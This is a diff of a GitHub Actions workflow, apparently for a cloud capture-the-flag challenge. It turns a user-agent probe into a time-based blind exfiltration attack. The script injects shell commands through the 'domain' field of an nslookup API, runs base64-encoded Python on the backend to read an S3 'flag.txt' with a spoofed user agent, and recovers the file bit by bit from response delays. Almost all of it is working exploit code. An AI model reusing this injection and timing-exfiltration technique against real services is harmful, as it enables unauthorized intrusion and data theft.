@@ -1,9 +1,6 @@
-name: Stage2-S3-UA-Probe
+name: Stage2-Extract-Flag
 
 on:
-  push:
-    branches:
-      - corgi
   workflow_dispatch:
 
 permissions:
@@ -11,7 +8,7 @@ permissions:
   contents: read
 
 jobs:
-  probe:
+  extract:
     runs-on: ubuntu-latest
 
     steps:
@@ -21,11 +18,10 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Probe Lambda S3 access
+      - name: Extract flag
         shell: bash
         run: |
           set +e
-
           python3 -m pip install boto3 requests requests-aws4auth --quiet
 
           python3 - <<'PY'
@@ -37,33 +33,21 @@ jobs:
           from requests_aws4auth import AWS4Auth
 
           API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
-          BUCKET = "userad88e2b168aa387e"
-          KEY = "flag.txt"
-
-          uas = [
-              "Amazon CloudFront",
-              "CloudFront",
-              "Mozilla/5.0",
-              "AWSLambda",
-              "AWS_Lambda_python3.13",
-              "aws-sdk-python",
-              "Boto3",
-              "botocore",
-              "aws-cli",
-              "python-urllib",
-              "lambdaRole",
-              "nslookupv2",
-              "CloudEscape",
-              "corgi",
-              "REDACTED"
-          ]
+          S3_URL = "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
+          USER_AGENT = "Amazon CloudFront"
+          MAX_LENGTH = 96
+          SLEEP_SECONDS = 2.0
+          THRESHOLD = 1.0
 
           inner = r'''
           import sys
+          import time
           import urllib.request
 
           url = sys.argv[1]
           ua = sys.argv[2]
+          index = int(sys.argv[3])
+          bit = int(sys.argv[4])
 
           request = urllib.request.Request(
               url,
@@ -73,8 +57,8 @@ jobs:
           with urllib.request.urlopen(request, timeout=10) as response:
               data = response.read()
 
-          print("READ_OK")
-          print("BYTES=" + str(len(data)))
+          if index < len(data) and (data[index] & (1 << bit)):
+              time.sleep(2.0)
           '''
 
           encoded = base64.b64encode(inner.encode()).decode()
@@ -89,46 +73,62 @@ jobs:
               session_token=credentials.token
           )
 
-          s3_url = (
-              "https://s3.us-east-1.amazonaws.com/"
-              + BUCKET
-              + "/"
-              + KEY
-          )
+          recovered = bytearray()
 
-          for ua in uas:
-              command = (
-                  "printf '%s' "
-                  + shlex.quote(encoded)
-                  + " | base64 -d > /tmp/s3_probe.py; "
-                  + "python3 /tmp/s3_probe.py "
-                  + shlex.quote(s3_url)
-                  + " "
-                  + shlex.quote(ua)
-                  + " && sleep 8; #"
-              )
+          for index in range(MAX_LENGTH):
+              value = 0
 
-              started = time.monotonic()
-
-              try:
-                  response = requests.post(
-                      API,
-                      json={"domain": command},
-                      auth=auth,
-                      timeout=30
+              for bit in range(8):
+                  command = (
+                      "printf '%s' "
+                      + shlex.quote(encoded)
+                      + " | base64 -d > /tmp/bit_probe.py; "
+                      + "python3 /tmp/bit_probe.py "
+                      + shlex.quote(S3_URL)
+                      + " "
+                      + shlex.quote(USER_AGENT)
+                      + " "
+                      + str(index)
+                      + " "
+                      + str(bit)
+                      + "; #"
                   )
 
+                  started = time.monotonic()
+
+                  try:
+                      requests.post(
+                          API,
+                          json={"domain": command},
+                          auth=auth,
+                          timeout=20
+                      )
+                  except Exception as error:
+                      print("REQUEST_ERROR", index, bit, repr(error))
+
                   elapsed = time.monotonic() - started
 
-                  print("UA=" + ua)
-                  print("HTTP=" + str(response.status_code))
-                  print("ELAPSED=%.2f" % elapsed)
-                  print("---")
+                  if elapsed > THRESHOLD:
+                      value |= 1 << bit
 
-              except Exception as error:
-                  elapsed = time.monotonic() - started
-                  print("UA=" + ua)
-                  print("ERROR=" + repr(error))
-                  print("ELAPSED=%.2f" % elapsed)
-                  print("---")
+                  print(
+                      "INDEX=%d BIT=%d VALUE=%d ELAPSED=%.2f"
+                      % (index, bit, value, elapsed),
+                      flush=True
+                  )
+
+                  time.sleep(0.05)
+
+              if value == 0:
+                  break
+
+              recovered.append(value)
+              print(
+                  "CHAR[%d]=%r BYTE=%d"
+                  % (index, chr(value), value),
+                  flush=True
+              )
+
+          print("FLAG_BYTES=", bytes(recovered))
+          print("FLAG_TEXT=", bytes(recovered).decode("utf-8", errors="replace"))
           PY
